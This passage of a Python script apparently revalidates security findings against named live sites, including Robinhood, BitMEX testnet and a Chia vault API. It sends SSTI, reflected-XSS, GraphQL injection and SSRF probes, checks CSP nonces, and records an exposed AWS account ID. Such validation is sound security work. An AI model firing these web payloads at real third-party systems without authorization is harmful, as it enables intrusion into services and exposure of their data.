            record("M34", "Robinhood SSRF via oktaLogin (WAF blocked)", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"WAF blocks SSRF: {r.text[:150]}")
        elif "169.254" in r.text or "meta-data" in r.text:
            record("M34", "Robinhood SSRF via oktaLogin", "medium", "robinhood.com",
                   "VALID", f"SSRF response: {r.text[:200]}")
        else:
            record("M34", "Robinhood SSRF via oktaLogin", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:150]}")

    # ── M35: Robinhood SSTI on explorer ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://explorer.testnet.chain.robinhood.com/api/v2/search?q={{7*7}}")
        if "49" in r.text and r.status_code == 200:
            # Check if 49 is actually template evaluation
            r2 = await safe_get(c, "https://explorer.testnet.chain.robinhood.com/api/v2/search?q={{7*8}}")
            if "56" in r2.text:
                record("M35", "Robinhood explorer SSTI", "medium", "robinhood.com",
                       "VALID", f"7*7=49 AND 7*8=56 — SSTI confirmed: {r.text[:100]}")
            else:
                record("M35", "Robinhood explorer SSTI", "medium", "robinhood.com",
                       "INCONCLUSIVE", f"49 in response but 56 not found for 7*8")
        else:
            record("M35", "Robinhood explorer SSTI", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:100]}")

    # ── M36: Robinhood XSS on share.robinhood.com ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, 'https://share.robinhood.com/<script>alert(1)</script>')
        if "<script>alert(1)</script>" in r.text:
            record("M36", "Robinhood XSS on share.robinhood.com", "medium", "robinhood.com",
                   "VALID", "Script reflected unescaped")
        else:
            record("M36", "Robinhood XSS on share.robinhood.com", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"Input encoded/blocked: {r.status_code}")

    # ── M37: BitMEX static CSP nonce ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        nonces = set()
        for _ in range(3):
            r = await safe_get(c, "https://testnet.bitmex.com/")
            csp = r.headers.get("content-security-policy", "")
            nonce_matches = re.findall(r"nonce-([a-f0-9]+)", csp)
            nonces.update(nonce_matches)
        if len(nonces) == 1:
            record("M37", "BitMEX static CSP nonce", "medium", "testnet.bitmex.com",
                   "VALID", f"Same nonce across requests: {nonces.pop()}")
        elif nonces:
            record("M37", "BitMEX static CSP nonce", "medium", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"Nonces vary: {nonces}")
        else:
            record("M37", "BitMEX static CSP nonce", "medium", "testnet.bitmex.com",
                   "FALSE POSITIVE", "No CSP nonce found")

    # ── M38: BitMEX no CSP on API ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://testnet.bitmex.com/api/v1/chat?channelID=2&count=1")
        csp = r.headers.get("content-security-policy", "")
        if not csp:
            record("M38", "BitMEX no CSP on API endpoints", "medium", "testnet.bitmex.com",
                   "VALID", "No CSP header on /api/v1/* — stored XSS executes unrestricted")
        else:
            record("M38", "BitMEX no CSP on API endpoints", "medium", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"CSP present: {csp[:100]}")

    # ── M39: BitMEX SSTI in guild ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://testnet.bitmex.com/api/v1/guild")
        if r.status_code == 200 and "{{7*7}}" in r.text:
            record("M39", "BitMEX SSTI in guild name", "medium", "testnet.bitmex.com",
                   "INCONCLUSIVE", "{{7*7}} stored but evaluation depends on rendering context")
        else:
            record("M39", "BitMEX SSTI in guild name", "medium", "testnet.bitmex.com",
                   "FALSE POSITIVE", "Payload not found in guild data")

    # ── M40: Vault SQLi/GraphQL injection ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://api.vault.chiatest.net/graphql",
                            json={"query": '{ user(id: "test\\"") { id } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if "unterminated" in r.text.lower() or "syntax" in r.text.lower():
            record("M40", "Vault GraphQL injection", "medium", "vault.chiatest.net",
                   "INCONCLUSIVE", f"Syntax error on injection: {r.text[:200]}")
        else:
            record("M40", "Vault GraphQL injection", "medium", "vault.chiatest.net",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── M41: Linktr.ee AWS Account ID ──
    record("M41", "Linktr.ee AWS Account ID exposure", "medium", "linktr.ee",
           "VALID" if any(r["id"] == "C6" and r["status"] == "VALID" for r in results) else "FALSE POSITIVE",
           "AWS Account ID 824542542892 exposed via SQS response headers (confirmed in C6)")


async def main():
    print("=" * 60)
    print("  COMPREHENSIVE FINDING REVALIDATION")
    print(f"  {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    await validate_critical()
    await validate_high()
    await validate_medium()

    # ═══ SUMMARY ═══
    print("\n" + "="*60)
    print("  FINAL RESULTS")
    print("="*60)

    valid = [r for r in results if r["status"] == "VALID"]
    fp = [r for r in results if r["status"] == "FALSE POSITIVE"]
    inc = [r for r in results if r["status"] == "INCONCLUSIVE"]
    err = [r for r in results if r["status"] == "ERROR"]

    print(f"\n  VALID: {len(valid)}  |  FALSE POSITIVE: {len(fp)}  |  INCONCLUSIVE: {len(inc)}  |  ERROR: {len(err)}")
    print(f"  Total tested: {len(results)}")

    for sev in ["critical", "high", "medium"]:
        sev_results = [r for r in results if r["severity"] == sev]
        sev_valid = [r for r in sev_results if r["status"] == "VALID"]
        sev_fp = [r for r in sev_results if r["status"] == "FALSE POSITIVE"]
        print(f"  {sev.upper()}: {len(sev_valid)} valid / {len(sev_fp)} FP / {len(sev_results)} total")

    print("\n  VALID FINDINGS:")
    for r in valid:
        print(f"    [{r['severity'].upper()}] {r['domain']}: {r['name']}")

    with open("/tmp/validation_results_full.json", "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n  Saved to /tmp/validation_results_full.json")


asyncio.run(main())
